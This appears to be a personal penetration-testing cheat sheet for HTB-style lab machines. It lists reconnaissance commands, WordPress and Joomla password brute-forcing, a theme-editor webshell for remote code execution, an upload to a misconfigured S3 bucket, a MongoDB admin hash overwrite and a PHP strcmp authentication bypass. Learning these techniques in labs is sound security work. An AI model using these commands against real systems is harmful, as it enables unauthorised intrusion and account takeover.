<details>
  <summary><strong>CHECK</strong></summary>
  
```
web - whatweb/curl/burpsuite crawler/all html code
sql - injection/connect/enumeration/update
ftp - upload/download/hidden files
windows - powershell history/whoami/inside files(password leaking,source code,configurations)/responder-ntlm/
linux - inside files(password leaking,source code,configurations)

nmap - `-sU --top-ports 100`
ffuf - `mc all`
```

</details>

---
<details>
<summary><strong>awscli</strong></summary>
  
```bash
aws configure

aws s3 --endpoint-url=http://s3.thetoppers.htb ls

aws s3 --endpoint-url=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php .

aws s3 --endpoint-url=http://s3.thetoppers.htb cp ex.php s3://thetoppers.htb
```

</details>

---

<details>
  <summary><strong>Application Attack</strong></summary>

## Enumeration
```bash
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

sudo nmap --open -sV 10.129.201.50

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

## Wordpress
```bash
curl http://<wordpress>/robots.txt

curl http://<wordpress>/wp-login.php

curl http://<wordpress> | grep -i wordpress

curl http://<wordpress> | grep themes

curl http://<wordpress> | grep plugins

curl http://<wordpress>/?p=1 | grep plugins
```
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
### RCE
- `Appearance-Theme Editor`
<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## joomla
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
```bash
git clone https://github.com/drego85/JoomlaScan

python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
```bash
git clone https://github.com/ajnik/joomla-bruteforce

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```


</details>

---
<details>
  <summary><strong>TTY</strong></summary>

```bash
/usr/bin/script -qc /bin/bash
```
</details>

---
<details>
  <summary><strong>LDAP(389)</strong></summary>
</details>

---
<details>
  <summary><strong>mongosh</strong></summary>

```
mongosh --host 10.129.5.3

test> show dbs;

test> use sensitive_information;

sensitive_information> show collections;

sensitive_information> db.flag.find()

ace> db.admin.updateOne({name:'administrator'},{$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}});
```

</details>

---
<details>
  <summary><strong>PHP</strong></summary>

```php
if (strcmp($username, $_POST['username']) == 0)
```
- `strcmp`함수가 같은 값이면 0을 반환.
- PHP에서 파라미터를 제대로 검사하지 않으면 array를 전달할 수 있게 됨.(username=value 대신에 username[]=value)
- NULL 값은 0

</details>
